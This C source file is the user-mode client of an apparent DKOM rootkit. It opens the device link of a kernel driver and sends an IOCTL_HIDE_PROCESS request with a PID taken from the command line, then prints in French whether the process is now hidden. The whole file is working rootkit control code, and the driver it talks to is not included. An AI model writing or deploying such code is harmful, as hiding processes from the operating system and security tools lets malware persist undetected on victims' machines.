#include <windows.h>
#include <stdio.h>
#include "dkom.h"

#define DKOM_DEVICE_LINK L"\\\\.\\DkomDriverLink"

int main(int argc, char *argv[])
{
    HANDLE hDevice;
    DWORD pid;
    DWORD bytesReturned = 0;
    BOOL ok;

    if (argc < 2) {
        printf("Usage: %s <pid>\n", argv[0]);
        return 1;
    }

   pid = (DWORD)atoi(argv[1]);

    hDevice = CreateFileW(DKOM_DEVICE_LINK, GENERIC_READ | GENERIC_WRITE,
                          0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] ouverture echouee err=%lu\n", GetLastError());
        return 1;
    }

    ok = DeviceIoControl(hDevice, IOCTL_HIDE_PROCESS,
                         &pid, sizeof(pid),
                         NULL, 0, &bytesReturned, NULL);
    if (!ok)
        printf("[-] DeviceIoControl echoue err=%lu\n", GetLastError());
    else
        printf("[+] PID %lu masque\n", pid);

    CloseHandle(hDevice);
    return ok ? 0 : 1;
}
